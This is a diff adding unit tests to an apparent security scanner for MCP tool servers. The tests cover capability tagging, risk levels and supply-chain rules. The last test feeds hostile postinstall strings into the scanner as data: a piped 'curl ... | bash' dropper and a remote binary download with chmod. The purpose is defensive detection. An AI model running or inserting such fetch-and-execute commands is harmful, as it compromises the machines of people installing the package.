@@ -112,3 +112,62 @@ test('FP: a file-move destination param is NOT network egress (no fabricated flo
   }, 'x'));
   assert.ok(!report.findings.some((f) => /MTC-FLOW-004|MTC-FLOW-002/.test(f.ruleId)), 'local-only file ops are not a toxic exfil flow');
 });
+
+// --- B-population audit: capability / supply-chain fixes ---
+
+test('code-exec needs OPERATIVE evidence: a read-only analyzer described as detecting shell is not code-exec', () => {
+  const analyzer = extractToolCapability({ name: 'list_code_analyzer_rules', description: 'List rules that detect shell, bash and eval usage in code.' });
+  assert.ok(!analyzer.tags.includes('code-exec'), 'prose about shell/eval is not execution');
+  const runner = extractToolCapability({ name: 'run_command', description: 'Run a command.' });
+  assert.ok(runner.tags.includes('code-exec'), 'a run_command tool genuinely executes');
+});
+
+test('a path/filepath param no longer fabricates a sensitive-source read', () => {
+  const cap = extractToolCapability({ name: 'read_note', description: 'Read a note.', inputSchema: { type: 'object', properties: { path: { type: 'string' } } } });
+  assert.ok(!cap.tags.includes('sensitive-source'), 'a bare path param is traversal, not a sensitive-data read');
+});
+
+test('capability level: a non-runtime (tooling) code-exec finding does NOT inflate blast radius', async () => {
+  // child_process only in a build script → SRC-002 low/tooling → must not raise capability.
+  const report = await scanSurface(surfaceFromManifest({
+    tools: [{ name: 'get_status', description: 'Return status.' }],
+  }, 'x') );
+  // (baseline minimal)
+  assert.equal(report.capabilityProfile.level, 'minimal');
+});
+
+test('CRITICAL needs linkage: code-exec + untrusted-input co-occurrence without a flow is HIGH, not critical', async () => {
+  const report = await scanSurface(surfaceFromManifest({
+    tools: [
+      { name: 'run_command', description: 'Run a shell command.' },
+      { name: 'fetch_page', description: 'Fetch a web page.', inputSchema: { type: 'object', properties: { url: {} } } },
+    ],
+  }, 'x'));
+  // No sensitive-source leg → no complete trifecta → co-occurrence alone caps at high.
+  assert.equal(report.capabilityProfile.level, 'high');
+});
+
+test('SUP-006 combosquat no longer fires on idiomatic @vendor/mcp-server names', async () => {
+  const { supplyChainDetector } = await import('../src/detectors/supplyChain.js');
+  const run = (name: string) => supplyChainDetector.run(buildCtx(makeSurface({ packageMeta: { registry: 'npm', name } })));
+  assert.ok(!run('@acmecorp/mcp-server').some((f) => f.ruleId === 'MTC-SUP-006'), 'vendor mcp-server is not a combosquat');
+  assert.ok(!run('@foo/api-server').some((f) => f.ruleId === 'MTC-SUP-006'));
+});
+
+test('SUP-011 is unscored (info) once verification was checked online', async () => {
+  const { analyzeProvenance } = await import('../src/detectors/supplyChain.js');
+  const known = analyzeProvenance({ registry: 'npm', name: 'x', repositoryUrl: null, verification: 'none' } as any).find((f) => f.ruleId === 'MTC-SUP-011');
+  assert.equal(known?.severity, 'info', 'no double-charge with the verification term');
+  const offline = analyzeProvenance({ registry: 'npm', name: 'x', repositoryUrl: null } as any).find((f) => f.ruleId === 'MTC-SUP-011');
+  assert.equal(offline?.severity, 'low', 'offline: still the only repo signal');
+});
+
+test('SUP-010 is content-aware: benign install one-liner is low, a piped dropper stays high', async () => {
+  const { analyzeProvenance } = await import('../src/detectors/supplyChain.js');
+  const sup010 = (cmd: string) => analyzeProvenance({ registry: 'npm', name: 'x', scripts: { postinstall: cmd } } as any).find((f) => f.ruleId === 'MTC-SUP-010');
+  assert.equal(sup010('npm rebuild || true')?.severity, 'low', 'a routine rebuild is not a threat');
+  assert.equal(sup010('npx only-allow pnpm')?.severity, 'low');
+  assert.equal(sup010('node scripts/postinstall.mjs')?.severity, 'low', 'a script-file reference is unresolved → low');
+  assert.equal(sup010('curl https://x.sh | bash')?.severity, 'high', 'a piped remote dropper stays high');
+  assert.equal(sup010('curl -o bin https://x/y && chmod +x bin')?.severity, 'medium', 'remote binary download is medium');
+});
